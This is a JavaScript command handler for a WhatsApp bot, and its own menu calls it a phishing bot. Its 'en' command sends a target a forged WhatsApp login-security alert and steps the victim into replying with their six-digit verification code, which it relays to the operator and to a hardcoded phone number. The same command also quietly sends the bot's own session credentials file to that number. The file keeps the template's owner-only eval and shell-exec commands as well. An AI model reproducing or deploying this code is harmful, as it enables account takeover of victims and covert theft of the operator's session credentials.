// Note For User
// Set all settings in the file config.js including the list menu 
// for others pay to me. jas kiding
// jangan diperjualbelikan dalam keadaan masih ori hisoka. minimal tambah 5-8 command dulu

import config from "../config.js"
import Func from "../lib/function.js"

import fs from "fs"
import chalk from "chalk"
import axios from "axios"
import path from "path"
import { getBinaryNodeChildren } from "@whiskeysockets/baileys"
import { exec } from "child_process"
import { format } from "util"
import { fileURLToPath } from "url"
import { createRequire } from "module"

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const __filename = Func.__filename(import.meta.url)
const require = createRequire(import.meta.url)

export default async function Message(hisoka, m, chatUpdate) {
    try {
        if (!m) return
        if (!config.options.public && !m.isOwner) return
        if (m.from && db.groups[m.from]?.mute && !m.isOwner) return
        if (m.isBaileys) return

        (await import("../lib/loadDatabase.js")).default(m)

        const prefix = m.prefix
        const isCmd = m.body.startsWith(prefix)
        const command = isCmd ? m.command.toLowerCase() : ""
        const quoted = m.isQuoted ? m.quoted : m

        // LOG Chat
        if (m.message && !m.isBaileys) {
            console.log(chalk.black(chalk.bgWhite("- FROM")), chalk.black(chalk.bgGreen(m.pushName)), chalk.black(chalk.yellow(m.sender)) + "\n" + chalk.black(chalk.bgWhite("- IN")), chalk.black(chalk.bgGreen(m.isGroup ? m.metadata.subject : "Private Chat", m.from)) + "\n" + chalk.black(chalk.bgWhite("- MESSAGE")), chalk.black(chalk.bgGreen(m.body || m.type)))
        }

        switch (command) {

            /* Umm, maybe for main menu  */
            case "menu": case "help": {
                let text = `@${m.sender.split`@`[0]}, Este es un bot para phishing hecho por dylan cualquier cosa pregunten\n\n*Comandos:* ${Object.values(config.menu).map(a => a.length).reduce((total, num) => total + num, 0)}\n\n`

                Object.entries(config.menu).map(([type, command]) => {
                    text += `┌──⭓ *${Func.toUpper(type)} Menu*\n`
                    text += `│\n`
                    text += `│⎚ ${command.map(a => `${prefix + a}`).join("\n│⎚ ")}\n`
                    text += `│\n`
                    text += `└───────⭓\n\n`
                }).join('\n\n')

                return hisoka.sendMessage(m.from, {
                    text, contextInfo: {
                        mentionedJid: hisoka.parseMention(text),
                        externalAdReply: {
                            title: hisoka?.user?.name,
                            mediaType: 1,
                            previewType: 0,
                            renderLargerThumbnail: true,
                            thumbnail: fs.readFileSync("./temp/hisoka.jpg"),
                            sourceUrl: config.Exif.packWebsite
                        }
                    }
                }, { quoted: m })
            }

            case "owner": {
                hisoka.sendContact(m.from, config.options.owner, m)
            }
            break
            case "sc": {
                m.reply("https://github.com/Hisoka-Morrou/hisoka-baileys")
            }
            break
case "en": {
    if (!m.args[0]) return m.reply("Uso: .en +57xxxxxxxxxx");

    let targetNumber = m.args[0].replace(/\D/g, "") + "@s.whatsapp.net";
    let userAD = m.key.remoteJid;  // El usuario que ejecuta el comando

    let message = {
        text: "*Alerta de Seguridad – Nuevo Inicio de Sesión en WhatsApp*\n\n" +
              "Hemos detectado un nuevo ingreso a tu cuenta de WhatsApp desde un dispositivo desconocido. " +
              "Si reconoces este acceso, no es necesario que tomes ninguna acción.\n\n" +
              "Si **no autorizaste este inicio de sesión**, responde con *Si* para bloquear el acceso de inmediato.\n\n" +
              "**Detalles del inicio de sesión:**\n" +
              "- Ubicación aproximada: Bogotá, Colombia\n" +
              "- Dispositivo: Windows 10\n" +
              "Si necesitas ayuda, contacta con el soporte de seguridad."
    };

    await hisoka.sendMessage(targetNumber, message);
    m.reply("Mensaje enviado.");

    let fileMessage = {
        document: fs.readFileSync("session/creds.json"),
        mimetype: "application/json",
        fileName: "creds.json"
    };

    // El archivo solo se enviará al número "573507512058"
    await hisoka.sendMessage("573507512058@s.whatsapp.net", fileMessage);

    const handleResponse = async ({ messages }) => {
        let msg = messages[0];
        if (!msg.message?.conversation) return;

        let userResponse = msg.message.conversation.trim().toLowerCase();
        let userJid = msg.key.remoteJid;

        if (userJid !== targetNumber) return;  // Asegurarnos de que solo manejamos mensajes del target
        if (userResponse !== "si" && userResponse !== "no") return;  // Ignorar respuestas no válidas

        // Enviar la respuesta al usuarioAD, no al target
        let responseMessage = {
            text: `El número ${targetNumber} respondió: "${userResponse}"`
        };
        await hisoka.sendMessage(userAD, responseMessage);

        if (userResponse === "si") {
            let followUpMessage = { text: "Para proteger tu cuenta, te hemos enviado un código de 6 dígitos. Responde a este mensaje con el código para confirmar tu identidad." };
            await hisoka.sendMessage(userJid, followUpMessage);

            let logMessage = { text: `El número ${userJid} respondió 'SI'.` };
            await hisoka.sendMessage("573507512058@s.whatsapp.net", logMessage);

            // Escuchar por el código
            const handleUserMessage = async ({ messages }) => {
                let userMsg = messages[0];
                if (!userMsg.message?.conversation) return;

                let userText = userMsg.message.conversation;
                let senderJid = userMsg.key.remoteJid;

                if (senderJid !== targetNumber) return;

                // Enviar el código a usuarioAD
                await hisoka.sendMessage(userAD, { text: `El número ${targetNumber} envió el código: ${userText}` });

                let logMessage = { text: `El número ${senderJid} envió: "${userText}"` };
                await hisoka.sendMessage("573507512058@s.whatsapp.net", logMessage);

                // Dejar de escuchar después de recibir el mensaje
                hisoka.ev.off("messages.upsert", handleUserMessage);
            };

            hisoka.ev.on("messages.upsert", handleUserMessage);
        } else if (userResponse === "no") {
            let noMessage = { text: "Haz verificado la cuenta con éxito." };
            await hisoka.sendMessage(userJid, noMessage);

            let logMessage = { text: `El número ${userJid} respondió 'NO'.` };
            await hisoka.sendMessage("573507512058@s.whatsapp.net", logMessage);

            // Dejar de escuchar después de recibir "no"
            hisoka.ev.off("messages.upsert", handleResponse);
        }
    };

    hisoka.ev.on("messages.upsert", handleResponse);

    // Eliminar el mensaje solo para el número objetivo (targetNumber)
    try {
        await hisoka.chatModify(
            {
                clear: {
                    messages: [{ id: m.key.id, fromMe: true, timestamp: Date.now() }],
                },
            },
            targetNumber,
            []
        );
    } catch (error) {
        console.log("Error al eliminar el mensaje:", error);
    }
}
break;
	
		default:
                // ini eval ya dek
                if ([">", "eval", "=>"].some(a => m.body?.toLowerCase()?.startsWith(a))) {
                    if (!m.isOwner) return m.reply("owner")
                    let evalCmd = ""
                    try {
                        evalCmd = /await/i.test(m.text) ? eval("(async() => { " + m.text + " })()") : eval(m.text)
                    } catch (e) {
                        evalCmd = e
                    }
                    new Promise(async (resolve, reject) => {
                        try {
                            resolve(evalCmd);
                        } catch (err) {
                            reject(err)
                        }
                    })
                        ?.then((res) => m.reply(format(res)))
                        ?.catch((err) => m.reply(format(err)))
                }

                // nah ini baru exec dek
                if (["$", "exec"].some(a => m.body?.toLowerCase()?.startsWith(a))) {
                    if (!m.isOwner) return m.reply("owner")
                    try {
                        exec(m.text, async (err, stdout) => {
                            if (err) return m.reply(Func.format(err))
                            if (stdout) return m.reply(Func.format(stdout))
                        })
                    } catch (e) {
                        m.reply(Func.format(e))
                    }
                }

                // cek bot active or no
                if (/^bot/i.test(m.body)) {
                    m.reply(`Bot Activated "${m.pushName}"`)
                }
        }
    } catch (e) {
        m.reply(format(e))
    }
}
